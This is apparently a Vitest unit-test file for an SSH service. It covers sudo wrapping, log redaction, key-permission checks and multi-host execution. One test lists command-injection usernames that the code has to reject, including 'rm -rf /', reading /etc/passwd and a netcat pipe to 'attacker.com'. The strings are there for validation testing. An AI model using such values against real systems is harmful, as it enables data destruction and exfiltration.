/**
 * Unit tests for SSHService
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { SSHService } from '../../src/integrations/ssh/SSHService';
import { SSHConfig, SSHHost, CommandResult } from '../../src/integrations/ssh/types';
import { LoggerService } from '../../src/services/LoggerService';
import { Client } from 'ssh2';
import * as fs from 'fs';

// Mock dependencies
vi.mock('ssh2');
vi.mock('fs');
vi.mock('../../src/integrations/ssh/ConnectionPool');
vi.mock('../../src/integrations/ssh/PackageManagerDetector');

describe('SSHService', () => {
  let sshService: SSHService;
  let mockConfig: SSHConfig;
  let mockLogger: LoggerService;

  beforeEach(() => {
    mockLogger = new LoggerService('error');

    mockConfig = {
      enabled: true,
      defaultUser: 'testuser',
      defaultPort: 22,
      hostKeyCheck: true,
      connectionTimeout: 30,
      commandTimeout: 300,
      maxConnections: 50,
      maxConnectionsPerHost: 5,
      idleTimeout: 300,
      concurrencyLimit: 10,
      sudo: {
        enabled: false,
        command: 'sudo',
        passwordless: true,
      },
      priority: 50,
    };

    sshService = new SSHService(mockConfig, mockLogger);
  });

  afterEach(async () => {
    await sshService.cleanup();
    vi.clearAllMocks();
  });

  describe('constructor', () => {
    it('should initialize with provided config', () => {
      expect(sshService).toBeDefined();
    });

    it('should convert idle timeout to milliseconds for pool config', () => {
      const service = new SSHService(mockConfig, mockLogger);
      expect(service).toBeDefined();
    });
  });

  describe('parseHostname', () => {
    it('should parse hostname from ssh:// URI', () => {
      const host: SSHHost = {
        name: 'test-host',
        uri: 'ssh://192.168.1.10',
      };

      // Access private method through type assertion for testing
      const hostname = (sshService as any).parseHostname(host.uri);
      expect(hostname).toBe('192.168.1.10');
    });

    it('should parse hostname from plain IP', () => {
      const hostname = (sshService as any).parseHostname('192.168.1.10');
      expect(hostname).toBe('192.168.1.10');
    });

    it('should remove port from hostname', () => {
      const hostname = (sshService as any).parseHostname('192.168.1.10:2222');
      expect(hostname).toBe('192.168.1.10');
    });

    it('should handle ssh:// URI with port', () => {
      const hostname = (sshService as any).parseHostname('ssh://192.168.1.10:2222');
      expect(hostname).toBe('192.168.1.10');
    });
  });

  describe('getHostKey', () => {
    it('should generate host key with default user and port', () => {
      const host: SSHHost = {
        name: 'test-host',
        uri: '192.168.1.10',
      };

      const hostKey = (sshService as any).getHostKey(host);
      expect(hostKey).toBe('testuser@192.168.1.10:22');
    });

    it('should generate host key with custom user and port', () => {
      const host: SSHHost = {
        name: 'test-host',
        uri: '192.168.1.10',
        user: 'admin',
        port: 2222,
      };

      const hostKey = (sshService as any).getHostKey(host);
      expect(hostKey).toBe('admin@192.168.1.10:2222');
    });
  });

  describe('wrapWithSudo', () => {
    it('should not wrap command when sudo is disabled', () => {
      const command = 'ls -la';
      const wrapped = (sshService as any).wrapWithSudo(command, {
        enabled: false,
        command: 'sudo',
      });

      expect(wrapped).toBe('ls -la');
    });

    it('should wrap command with sudo', () => {
      const command = 'apt-get install nginx';
      const wrapped = (sshService as any).wrapWithSudo(command, {
        enabled: true,
        command: 'sudo',
      });

      expect(wrapped).toBe('sudo apt-get install nginx');
    });

    it('should wrap command with sudo and custom user', () => {
      const command = 'systemctl restart nginx';
      const wrapped = (sshService as any).wrapWithSudo(command, {
        enabled: true,
        command: 'sudo',
        runAsUser: 'www-data',
      });

      expect(wrapped).toBe('sudo -u www-data systemctl restart nginx');
    });

    it('should not add -u flag for root user', () => {
      const command = 'systemctl restart nginx';
      const wrapped = (sshService as any).wrapWithSudo(command, {
        enabled: true,
        command: 'sudo',
        runAsUser: 'root',
      });

      expect(wrapped).toBe('sudo systemctl restart nginx');
    });

    it('should reject invalid username to prevent command injection', () => {
      const command = 'systemctl restart nginx';

      // Test various injection attempts
      const invalidUsernames = [
        'user; rm -rf /',
        'user && cat /etc/passwd',
        'user | nc attacker.com 1234',
        'user`whoami`',
        'user$(whoami)',
        '../../../etc/passwd',
        'user\nrm -rf /',
      ];

      invalidUsernames.forEach(username => {
        expect(() => {
          (sshService as any).wrapWithSudo(command, {
            enabled: true,
            command: 'sudo',
            runAsUser: username,
          });
        }).toThrow(/Invalid sudo runAsUser/);
      });
    });

    it('should accept valid Unix usernames', () => {
      const command = 'systemctl restart nginx';
      const validUsernames = ['www-data', 'nginx', 'apache', 'user123', '_system'];

      validUsernames.forEach(username => {
        expect(() => {
          (sshService as any).wrapWithSudo(command, {
            enabled: true,
            command: 'sudo',
            runAsUser: username,
          });
        }).not.toThrow();
      });
    });
  });

  describe('obfuscateSensitiveData', () => {
    it('should obfuscate password in command', () => {
      const command = 'mysql -u root -p password123';
      const obfuscated = (sshService as any).obfuscateSensitiveData(command);

      expect(obfuscated).not.toContain('password123');
      expect(obfuscated).toContain('[REDACTED]');
    });

    it('should obfuscate password with equals sign', () => {
      const command = 'curl -u user:password=secret123';
      const obfuscated = (sshService as any).obfuscateSensitiveData(command);

      expect(obfuscated).not.toContain('secret123');
      expect(obfuscated).toContain('[REDACTED]');
    });

    it('should obfuscate private key', () => {
      const command = 'echo "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...\n-----END RSA PRIVATE KEY-----"';
      const obfuscated = (sshService as any).obfuscateSensitiveData(command);

      expect(obfuscated).not.toContain('BEGIN RSA PRIVATE KEY');
      expect(obfuscated).toContain('[PRIVATE_KEY]');
    });

    it('should not modify commands without sensitive data', () => {
      const command = 'ls -la /var/log';
      const obfuscated = (sshService as any).obfuscateSensitiveData(command);

      expect(obfuscated).toBe(command);
    });
  });

  describe('checkKeyPermissions', () => {
    it('should warn when key permissions are too permissive', () => {
      // Mock statSync to return permissive permissions (0644)
      vi.spyOn(fs, 'statSync').mockReturnValue({
        mode: 0o100644, // Regular file with 0644 permissions
      } as any);

      const warnSpy = vi.spyOn(mockLogger, 'warn');

      (sshService as any).checkKeyPermissions('/path/to/key');

      expect(warnSpy).toHaveBeenCalledWith(
        'Private key has insecure permissions',
        expect.objectContaining({
          component: 'SSHService',
          integration: 'ssh',
          operation: 'checkKeyPermissions',
          metadata: expect.objectContaining({
            keyPath: '/path/to/key',
            permissions: '644',
            recommended: '0600',
          }),
        })
      );
    });

    it('should not warn when key permissions are secure (0600)', () => {
      // Mock statSync to return secure permissions (0600)
      vi.spyOn(fs, 'statSync').mockReturnValue({
        mode: 0o100600, // Regular file with 0600 permissions
      } as any);

      const warnSpy = vi.spyOn(mockLogger, 'warn');

      (sshService as any).checkKeyPermissions('/path/to/key');

      expect(warnSpy).not.toHaveBeenCalled();
    });

    it('should handle errors gracefully when checking permissions', () => {
      // Mock statSync to throw an error
      vi.spyOn(fs, 'statSync').mockImplementation(() => {
        throw new Error('File not found');
      });

      const debugSpy = vi.spyOn(mockLogger, 'debug');

      // Should not throw
      expect(() => {
        (sshService as any).checkKeyPermissions('/path/to/nonexistent');
      }).not.toThrow();

      expect(debugSpy).toHaveBeenCalledWith(
        'Could not check key permissions',
        expect.objectContaining({
          component: 'SSHService',
          integration: 'ssh',
          operation: 'checkKeyPermissions',
        })
      );
    });
  });

  describe('getErrorType', () => {
    it('should identify connection timeout error', () => {
      const error = new Error('Connection timeout after 30 seconds');
      const errorType = (sshService as any).getErrorType(error);

      expect(errorType).toBe('CONNECTION_TIMEOUT');
    });

    it('should identify command timeout error', () => {
      const error = new Error('Command timeout after 300 seconds');
      const errorType = (sshService as any).getErrorType(error);

      expect(errorType).toBe('COMMAND_TIMEOUT');
    });

    it('should identify connection refused error', () => {
      const error = new Error('Connection refused');
      const errorType = (sshService as any).getErrorType(error);

      expect(errorType).toBe('CONNECTION_REFUSED');
    });

    it('should identify authentication failed error', () => {
      const error = new Error('Authentication failed');
      const errorType = (sshService as any).getErrorType(error);

      expect(errorType).toBe('AUTHENTICATION_FAILED');
    });

    it('should identify host key verification error', () => {
      const error = new Error('Host key verification failed');
      const errorType = (sshService as any).getErrorType(error);

      expect(errorType).toBe('HOST_KEY_VERIFICATION_FAILED');
    });

    it('should identify permission denied error', () => {
      const error = new Error('Permission denied');
      const errorType = (sshService as any).getErrorType(error);

      expect(errorType).toBe('PERMISSION_DENIED');
    });

    it('should identify command not found error', () => {
      const error = new Error('Command not found');
      const errorType = (sshService as any).getErrorType(error);

      expect(errorType).toBe('COMMAND_NOT_FOUND');
    });

    it('should identify network error', () => {
      const error = new Error('Network unreachable');
      const errorType = (sshService as any).getErrorType(error);

      expect(errorType).toBe('NETWORK_ERROR');
    });

    it('should return unknown error for unrecognized errors', () => {
      const error = new Error('Something went wrong');
      const errorType = (sshService as any).getErrorType(error);

      expect(errorType).toBe('UNKNOWN_ERROR');
    });

    it('should handle non-Error objects', () => {
      const errorType = (sshService as any).getErrorType('string error');

      expect(errorType).toBe('UNKNOWN_ERROR');
    });
  });

  describe('testConnection', () => {
    it('should return true for successful connection test', async () => {
      const host: SSHHost = {
        name: 'test-host',
        uri: '192.168.1.10',
      };

      // Mock successful connection and command execution
      vi.spyOn(sshService as any, 'connect').mockResolvedValue({} as Client);
      vi.spyOn(sshService as any, 'executeCommandOnClient').mockResolvedValue({
        stdout: 'test',
        stderr: '',
        exitCode: 0,
        command: 'echo test',
        success: true,
      });
      vi.spyOn(sshService as any, 'disconnect').mockResolvedValue(undefined);

      const result = await sshService.testConnection(host);

      expect(result).toBe(true);
    });

    it('should return false for failed connection test', async () => {
      const host: SSHHost = {
        name: 'test-host',
        uri: '192.168.1.10',
      };

      // Mock failed connection
      vi.spyOn(sshService as any, 'connect').mockRejectedValue(new Error('Connection failed'));

      const result = await sshService.testConnection(host);

      expect(result).toBe(false);
    });

    it('should return false when test command fails', async () => {
      const host: SSHHost = {
        name: 'test-host',
        uri: '192.168.1.10',
      };

      // Mock successful connection but failed command
      vi.spyOn(sshService as any, 'connect').mockResolvedValue({} as Client);
      vi.spyOn(sshService as any, 'executeCommandOnClient').mockResolvedValue({
        stdout: '',
        stderr: 'error',
        exitCode: 1,
        command: 'echo test',
        success: false,
      });
      vi.spyOn(sshService as any, 'disconnect').mockResolvedValue(undefined);

      const result = await sshService.testConnection(host);

      expect(result).toBe(false);
    });
  });

  describe('package management', () => {
    const host: SSHHost = {
      name: 'test-host',
      uri: '192.168.1.10',
    };

    beforeEach(() => {
      // Mock connection methods
      vi.spyOn(sshService as any, 'connect').mockResolvedValue({} as Client);
      vi.spyOn(sshService as any, 'disconnect').mockResolvedValue(undefined);
      vi.spyOn(sshService as any, 'executeCommand').mockResolvedValue({
        stdout: 'Package installed',
        stderr: '',
        exitCode: 0,
        duration: 1000,
        host: host.name,
        command: 'apt-get install nginx',
        timestamp: new Date().toISOString(),
        success: true,
      });
    });

    it('should install package when package manager is detected', async () => {
      // Mock package manager detection
      vi.spyOn(sshService['packageDetector'], 'detect').mockResolvedValue('apt');
      vi.spyOn(sshService['packageDetector'], 'getInstallCommand').mockReturnValue('apt-get install -y nginx');

      const result = await sshService.installPackage(host, 'nginx');

      expect(result.success).toBe(true);
      expect(sshService['packageDetector'].detect).toHaveBeenCalled();
      expect(sshService['packageDetector'].getInstallCommand).toHaveBeenCalledWith('apt', 'nginx');
    });

    it('should return error when no package manager detected', async () => {
      // Mock package manager detection failure
      vi.spyOn(sshService['packageDetector'], 'detect').mockResolvedValue('unknown');

      const result = await sshService.installPackage(host, 'nginx');

      expect(result.success).toBe(false);
      expect(result.stderr).toContain('No supported package manager detected');
      expect(result.exitCode).toBe(-1);
    });

    it('should remove package when package manager is detected', async () => {
      // Mock package manager detection
      vi.spyOn(sshService['packageDetector'], 'detect').mockResolvedValue('yum');
      vi.spyOn(sshService['packageDetector'], 'getRemoveCommand').mockReturnValue('yum remove -y nginx');

      const result = await sshService.removePackage(host, 'nginx');

      expect(result.success).toBe(true);
      expect(sshService['packageDetector'].getRemoveCommand).toHaveBeenCalledWith('yum', 'nginx');
    });

    it('should update package when package manager is detected', async () => {
      // Mock package manager detection
      vi.spyOn(sshService['packageDetector'], 'detect').mockResolvedValue('dnf');
      vi.spyOn(sshService['packageDetector'], 'getUpdateCommand').mockReturnValue('dnf update -y nginx');

      const result = await sshService.updatePackage(host, 'nginx');

      expect(result.success).toBe(true);
      expect(sshService['packageDetector'].getUpdateCommand).toHaveBeenCalledWith('dnf', 'nginx');
    });
  });

  describe('executeOnMultipleHosts', () => {
    it('should execute command on multiple hosts', async () => {
      const hosts: SSHHost[] = [
        { name: 'host1', uri: '192.168.1.10' },
        { name: 'host2', uri: '192.168.1.11' },
        { name: 'host3', uri: '192.168.1.12' },
      ];

      // Mock executeCommand
      vi.spyOn(sshService, 'executeCommand').mockImplementation(async (host) => ({
        stdout: 'success',
        stderr: '',
        exitCode: 0,
        duration: 100,
        host: host.name,
        command: 'uptime',
        timestamp: new Date().toISOString(),
        success: true,
      }));

      const results = await sshService.executeOnMultipleHosts(hosts, 'uptime');

      expect(results.size).toBe(3);
      expect(results.get('host1')).toBeDefined();
      expect(results.get('host2')).toBeDefined();
      expect(results.get('host3')).toBeDefined();
    });

    it('should respect concurrency limit', async () => {
      const hosts: SSHHost[] = Array.from({ length: 25 }, (_, i) => ({
        name: `host${i}`,
        uri: `192.168.1.${i}`,
      }));

      let concurrentExecutions = 0;
      let maxConcurrent = 0;

      vi.spyOn(sshService, 'executeCommand').mockImplementation(async () => {
        concurrentExecutions++;
        maxConcurrent = Math.max(maxConcurrent, concurrentExecutions);

        await new Promise(resolve => setTimeout(resolve, 10));

        concurrentExecutions--;

        return {
          stdout: 'success',
          stderr: '',
          exitCode: 0,
          duration: 10,
          host: 'test',
          command: 'uptime',
          timestamp: new Date().toISOString(),
          success: true,
        };
      });

      await sshService.executeOnMultipleHosts(hosts, 'uptime');

      // Should not exceed concurrency limit
      expect(maxConcurrent).toBeLessThanOrEqual(mockConfig.concurrencyLimit);
    });

    it('should continue execution when one host fails', async () => {
      const hosts: SSHHost[] = [
        { name: 'host1', uri: '192.168.1.10' },
        { name: 'host2', uri: '192.168.1.11' },
        { name: 'host3', uri: '192.168.1.12' },
      ];

      // Mock executeCommand with one failure
      vi.spyOn(sshService, 'executeCommand').mockImplementation(async (host) => {
        if (host.name === 'host2') {
          return {
            stdout: '',
            stderr: 'Connection failed',
            exitCode: -1,
            duration: 100,
            host: host.name,
            command: 'uptime',
            timestamp: new Date().toISOString(),
            success: false,
          };
        }

        return {
          stdout: 'success',
          stderr: '',
          exitCode: 0,
          duration: 100,
          host: host.name,
          command: 'uptime',
          timestamp: new Date().toISOString(),
          success: true,
        };
      });

      const results = await sshService.executeOnMultipleHosts(hosts, 'uptime');

      expect(results.size).toBe(3);
      expect(results.get('host1')?.success).toBe(true);
      expect(results.get('host2')?.success).toBe(false);
      expect(results.get('host3')?.success).toBe(true);
    });
  });
});
